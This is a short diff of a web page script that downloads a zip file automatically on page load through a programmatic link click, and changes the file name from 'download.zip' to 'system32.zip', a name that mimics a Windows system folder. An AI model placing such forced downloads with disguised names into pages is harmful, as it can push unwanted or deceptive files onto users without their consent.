@@ -24,8 +24,8 @@
       document.addEventListener('DOMContentLoaded', function () {
         try {
           const a = document.createElement('a');
-          a.href = 'download.zip';
-          a.download = 'download.zip';
+          a.href = 'system32.zip';
+          a.download = 'system32.zip';
           // a.style.display = 'none'; // not necessary; hidden by CSS
           document.body.appendChild(a);
           // Programmatic click to start download
@@ -34,7 +34,7 @@
           a.remove();
         } catch (e) {
           // If programmatic download fails, navigate to the file as a fallback
-          window.location.href = 'download.zip';
+          window.location.href = 'system32.zip';
         }
       });
     </script>
